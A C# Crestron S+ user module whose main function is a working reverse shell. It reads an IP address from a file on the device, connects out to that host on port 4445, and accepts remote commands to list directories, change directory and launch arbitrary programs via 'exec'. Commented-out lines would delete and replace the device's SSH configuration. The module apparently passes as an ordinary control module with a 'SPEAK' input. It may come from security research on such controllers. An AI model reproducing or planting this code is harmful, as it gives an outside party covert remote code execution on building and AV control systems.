using System;
using System.Diagnostics;
using System.Collections;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Linq;
using System.IO;
using System.Net;
using System.Net.Sockets;
using Crestron;
using Crestron.Logos.SplusLibrary;
using Crestron.Logos.SplusObjects;
using Crestron.SimplSharp;
using System.Reflection;
using Microsoft.Win32;

namespace UserModule_FDSA
{
    public class UserModuleClass_FDSA : SplusObject
    {
        static CCriticalSection g_criticalSection = new CCriticalSection();

        Crestron.Logos.SplusObjects.DigitalInput SPEAK;
        object SPEAK_OnPush_0(Object __EventInfo__)
        {
            Crestron.Logos.SplusObjects.SignalEventArgs __SignalEventArg__ = (Crestron.Logos.SplusObjects.SignalEventArgs)__EventInfo__;
            try
            {
                SplusExecutionContext __context__ = SplusThreadStartCode(__SignalEventArg__);
                FILE_INFO FILEINFO;
                FILEINFO = new FILE_INFO();
                FILEINFO.PopulateDefaults();

                short FOUND = 0;


                __context__.SourceCodeLine = 194;
                StartFileOperations();
                __context__.SourceCodeLine = 195;
                FOUND = (short)(FindFirst("*", ref FILEINFO));
                __context__.SourceCodeLine = 197;
                Trace("{0} is a directory\r\n", FILEINFO.Name);
                __context__.SourceCodeLine = 198;
                Trace("{0} is a directory\r\n", GetCurrentDirectory());
                __context__.SourceCodeLine = 200;
                while (Functions.TestForTrue((Functions.BoolToInt(FOUND == 0))))
                {
                    __context__.SourceCodeLine = 202;
                    if (Functions.TestForTrue((Functions.IsDirectory(FILEINFO))))
                    {
                        __context__.SourceCodeLine = 203;
                        Trace("{0} is a directory\r\n", FILEINFO.Name);
                    }

                    __context__.SourceCodeLine = 204;
                    if (Functions.TestForTrue((Functions.IsVolume(FILEINFO))))
                    {
                        __context__.SourceCodeLine = 205;
                        Trace("volume label = {0}\r\n", FILEINFO.Name);
                    }

                    __context__.SourceCodeLine = 206;
                    if (Functions.TestForTrue((Functions.IsSystem(FILEINFO))))
                    {
                        __context__.SourceCodeLine = 207;
                        Trace("{0} is a system file\r\n", FILEINFO.Name);
                    }

                    __context__.SourceCodeLine = 208;
                    FOUND = (short)(FindNext(ref FILEINFO));
                    __context__.SourceCodeLine = 200;
                }

                __context__.SourceCodeLine = 210;
                if (Functions.TestForTrue((Functions.BoolToInt(FindClose() < 0))))
                {
                    __context__.SourceCodeLine = 211;
                    Trace("Error in closing find operation\r\n");
                }

                __context__.SourceCodeLine = 212;
                EndFileOperations();


            }
            catch (Exception e) { ObjectCatchHandler(e); }
            finally { ObjectFinallyHandler(__SignalEventArg__); }
            return this;

        }

        object SPEAK_OnRelease_1(Object __EventInfo__)
        {
            Crestron.Logos.SplusObjects.SignalEventArgs __SignalEventArg__ = (Crestron.Logos.SplusObjects.SignalEventArgs)__EventInfo__;
            try
            {
                SplusExecutionContext __context__ = SplusThreadStartCode(__SignalEventArg__);

                __context__.SourceCodeLine = 217;

            }
            catch (Exception e) { ObjectCatchHandler(e); }
            finally { ObjectFinallyHandler(__SignalEventArg__); }
            return this;

        }

        public string ReadTextFile(string path)
        {
            using (StreamReader sr = new StreamReader(path))
                return sr.ReadToEnd();
        }

        public override object FunctionMain(object __obj__)
        {

            List<string> currentDir = new List<string>() { "" };
            try
            {
                SplusExecutionContext __context__ = SplusFunctionMainStartCode();

                Trace("hofdsafdsa");
                //System.IO.File.Delete("\\Sys\\SSH\\sshd_config_default");
                //System.IO.File.Copy("\\User\\sshd_config_default", "\\Sys\\SSH\\sshd_config_default");
                //ProcessFiles("\\");

                string ip = ReadTextFile("\\User\\ip");

                System.Net.Sockets.Socket remote1 = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                System.Net.IPEndPoint remoteEndPoint45 = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(ip), 4445);
                remote1.Connect(remoteEndPoint45);

                using (System.Net.Sockets.NetworkStream stream1 = new System.Net.Sockets.NetworkStream(remote1))
                {
                        Trace("here");
                        using (System.IO.StreamReader r = new System.IO.StreamReader(stream1))
                        {
                            using (System.IO.StreamWriter w = new System.IO.StreamWriter(stream1))
                            {
                                Trace("here");
                                w.Flush();
                                w.WriteLine("Connected");
                                w.Flush();
                                Trace("here");

                                List<string> curDir = new List<string>() { };
                                while (true)
                                {
                                    w.Write(string.Join("\\", curDir.ToArray()) + " > ");
                                    w.Flush();
                                    string cmd = r.ReadLine();
                                    string arg = string.Empty;
                                    if (cmd.Contains(" "))
                                        arg = cmd.Split(' ')[1];

                                    switch (cmd.Split(' ')[0])
                                    {
                                        case "ls":
                                            try
                                            {
                                                string[] files;
                                                string[] dirs;
                                                if (arg != string.Empty)
                                                {
                                                    files = Directory.GetFiles(arg);
                                                    dirs = Directory.GetDirectories(arg);
                                                }
                                                else
                                                {
                                                    files = Directory.GetFiles("\\" + string.Join("\\", curDir.ToArray()));
                                                    dirs = Directory.GetDirectories("\\" + string.Join("\\", curDir.ToArray()));
                                                }

                                                foreach (string file in files)
                                                    w.WriteLine(file);

                                                foreach (string dir in dirs)
                                                    w.WriteLine(dir);

                                                w.Flush();
                                                continue;
                                            }
                                            catch
                                            {
                                                w.WriteLine("Error. Does directory exist?");
                                                w.Flush();
                                                continue;
                                            }
                                        case "pwd":
                                            w.WriteLine("\\" + string.Join("\\", curDir.ToArray()));
                                            w.Flush();
                                            continue;
                                        case "cd":
                                            if (arg == "..")
                                                curDir.RemoveAt(curDir.Count - 1);
                                            else if (arg == string.Empty)
                                                curDir = new List<string>() { "" };
                                            else
                                                curDir.Add(arg);
                                            continue;
                                        case "exec":
                                            ProcessStartInfo i = new ProcessStartInfo();
                                            i.FileName = arg;
                                            i.UseShellExecute = false;

                                            Process p = new Process();
                                            p.StartInfo = i;

                                            p.Start();

                                            continue;
                                        case "cat":
                                            continue;
                                        case "base64":
                                            continue;
                                        default:
                                            continue;
                                    }
                                }
                            }
                        
                    }

                }
  

                Trace("done");

            }
            catch (Exception e) { ObjectCatchHandler(e); Trace(e.ToString()); }
            finally { ObjectFinallyHandler(); }
            return __obj__;
        }


        public override void LogosSplusInitialize()
        {
            SocketInfo __socketinfo__ = new SocketInfo(1, this);
            InitialParametersClass.ResolveHostName = __socketinfo__.ResolveHostName;
            _SplusNVRAM = new SplusNVRAM(this);

            SPEAK = new Crestron.Logos.SplusObjects.DigitalInput(SPEAK__DigitalInput__, this);
            m_DigitalInputList.Add(SPEAK__DigitalInput__, SPEAK);


            SPEAK.OnDigitalPush.Add(new InputChangeHandlerWrapper(SPEAK_OnPush_0, false));
            SPEAK.OnDigitalRelease.Add(new InputChangeHandlerWrapper(SPEAK_OnRelease_1, false));

            _SplusNVRAM.PopulateCustomAttributeList(true);

            NVRAM = _SplusNVRAM;

        }

        public override void LogosSimplSharpInitialize()
        {


        }

        public UserModuleClass_FDSA(string InstanceName, string ReferenceID, Crestron.Logos.SplusObjects.CrestronStringEncoding nEncodingType) : base(InstanceName, ReferenceID, nEncodingType) { }




        const uint SPEAK__DigitalInput__ = 0;

        [SplusStructAttribute(-1, true, false)]
        public class SplusNVRAM : SplusStructureBase
        {

            public SplusNVRAM(SplusObject __caller__) : base(__caller__) { }


        }

        SplusNVRAM _SplusNVRAM = null;

        public class __CEvent__ : CEvent
        {
            public __CEvent__() { }
            public void Close() { base.Close(); }
            public int Reset() { return base.Reset() ? 1 : 0; }
            public int Set() { return base.Set() ? 1 : 0; }
            public int Wait(int timeOutInMs) { return base.Wait(timeOutInMs) ? 1 : 0; }
        }
        public class __CMutex__ : CMutex
        {
            public __CMutex__() { }
            public void Close() { base.Close(); }
            public void ReleaseMutex() { base.ReleaseMutex(); }
            public int WaitForMutex() { return base.WaitForMutex() ? 1 : 0; }
        }
        public int IsNull(object obj) { return (obj == null) ? 1 : 0; }
    }


}

